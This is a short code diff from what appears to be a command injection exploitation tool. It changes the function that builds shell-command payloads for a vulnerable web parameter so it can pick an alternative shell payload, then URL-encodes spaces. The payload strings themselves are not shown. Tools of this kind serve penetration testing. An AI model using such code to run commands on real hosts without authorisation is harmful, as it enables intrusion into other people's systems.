@@ -109,11 +109,15 @@ def injection_test_results(response,TAG):
 #----------------------------------------------
 # # The main command injection exploitation.
 #----------------------------------------------
-def injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter):
-  
-  # Execute shell commands on vulnerable host.
-  payload = cb_payloads.cmd_execution(separator,TAG,cmd)
-  
+def injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter,alter_shell):
+
+  if alter_shell:
+    # Classic decision payload (check if host is vulnerable).
+    payload = cb_payloads.cmd_execution_alter_shell(separator,TAG,cmd)
+  else:
+    # Classic decision payload (check if host is vulnerable).
+    payload = cb_payloads.cmd_execution(separator,TAG,cmd)
+
   if separator == " " :
     payload = re.sub(" ", "%20", payload)
   else:
